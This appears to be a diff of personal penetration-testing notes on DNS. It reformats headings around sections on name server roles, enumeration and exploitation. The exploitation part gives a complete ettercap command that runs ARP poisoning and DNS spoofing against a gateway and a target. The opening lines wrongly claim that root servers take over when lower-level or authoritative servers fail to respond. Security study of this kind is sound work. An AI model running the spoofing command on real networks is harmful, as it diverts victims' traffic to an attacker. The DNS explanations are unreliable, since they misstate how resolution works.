@@ -1,7 +1,9 @@
 
 #H2 Root Servers: Manage highest level of DNS hierarchy and oversee top level domains globally, stepping in if lower level servers fail to respond 
 **Authoritative Name Servers:** hold final authority for queries within designated zones, providing definitive responses. If they cannot respond, queries escalated to root servers
-# Enumeration 
+
+
+#H1 Enumeration 
 
 
 ```
@@ -21,7 +23,8 @@ maltego
 # Exploitation 
 ## DNS Spoofing 
 - Introducing corrupt DNS data into cache, causing it to return incorrect IP address, diverting traffic to attacker's computer 
-- ```
+
+```
 ettercap -T -q -M arp:remote /<gateway-ip>// /<target-ip>// -P dns_spoof
 ```
 
